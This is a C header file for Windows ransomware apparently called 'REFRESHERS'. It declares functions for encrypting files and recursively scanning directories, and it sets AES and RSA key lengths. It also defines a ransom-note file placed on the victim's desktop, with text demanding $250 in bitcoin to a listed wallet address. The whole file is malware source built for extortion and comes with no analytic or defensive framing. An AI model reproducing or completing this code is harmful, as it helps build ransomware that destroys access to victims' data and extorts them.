#pragma once


#include <Windows.h>
#include <tCHAR.h>
#include <wchar.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include "dirent.h"
#include "resource.h"
//mo
VOID encrypt_file(CONST CHAR *infile, INT enc);
HANDLE recursion;
//rec


//c
#define MAX(x, y) (x > y ? x : y)
#define MIN(x, y) (x > y ? y : x)
SIZE_T stupid_strlen(CONST CHAR* str);

void *_memcpy(void* dest, const void* src, size_t count);

// defs
#define ransomkey "REFRESHERS.bin"
#define publickey "REFRESHERS1"
#define encryptedkey "REFRESHERS2"
#define buffersize 1048576
#define signature "REFRESHERS"
#define signaturelen 12 //size of signiture +1
#define encryptkey 256 
#define rsakeylen 2048
#define aeskeylen 16
#define IMAGE "%TMP%/images10001.jpg" 
#define NOTE "%USERPROFILE%/Desktop/README_REFRESHERS.txt"
#define DROPNOTE  "All of your important files are encrypted by REFRESHERS!\nFiles Are Encrypted with AES + RSA.\nIf you want your files back send 250$ worth of bitcoin to the following address:\n 1EdFH91VEe6WrbXAdmSQMPc7Jug8RmPcNB \nFiles Will Be Decrypted Instantly Upon Payment!\n"

#define STRINGCONF L"REFRESHERS"


//typedefs



typedef struct _dirscan_config_s dirscan_config_t;
struct _dirscan_config_s {
	CHAR path[MAX_PATH];
	DWORD max_depth;
	DWORD depth;
};

INT start_dirscan(dirscan_config_t *config);
DWORD WINAPI dirscan_threadproc(LPVOID lpParam);
INT dirscan_recurse(dirscan_config_t *config);